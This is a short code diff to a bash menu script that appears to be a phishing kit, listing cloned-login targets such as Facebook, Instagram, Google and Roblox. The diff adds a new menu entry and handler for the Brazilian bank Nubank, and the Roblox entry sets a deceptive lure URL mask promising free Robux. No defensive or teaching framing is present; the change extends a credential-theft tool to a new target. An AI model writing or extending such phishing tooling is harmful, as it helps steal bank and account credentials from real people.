@@ -508,6 +508,7 @@ main_menu() {
 	printf "${CYAN}${BOLD}➤ [01] Facebook${RESET}\n"
     printf "${CYAN}${BOLD}➤ [02] Instagram${RESET}\n"
     printf "${CYAN}${BOLD}➤ [03] Google${RESET}\n"
+	printf "${CYAN}${BOLD}➤ [04] Nubank${RESET}\n"
     printf "${CYAN}${BOLD}➤ [35] Roblox${RESET}\n"
 
 	printf "${GRAY}Press Ctrl + C to Exit${RESET}\n\n"
@@ -523,6 +524,8 @@ main_menu() {
 			site_instagram;;
 		3 | 03)
 			site_gmail;;
+		4 | 04)
+			site_nubank;;
 		35)
 			website="roblox"
 			mask='https://get-free-robux'
